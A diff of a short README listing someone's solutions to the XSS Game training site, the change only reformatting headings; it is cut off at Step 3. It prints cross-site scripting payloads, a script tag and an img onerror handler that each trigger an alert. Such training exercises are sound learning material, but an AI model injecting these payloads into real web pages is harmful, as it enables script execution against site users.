@@ -1,15 +1,15 @@
 # Game-xss
 My solutions for https://xss-game.appspot.com
 
-##Step 1
+## Step 1
 ```javascript
 <script>alert(1);</script>
 ```
-##Step 2
+## Step 2
 ```html
 <img src="forbidden" onerror="alert('1')" />
 ```
-##Step 3
+## Step 3
 Replace
 ```html
 <img src="/static/level3/cloud3.jpg">
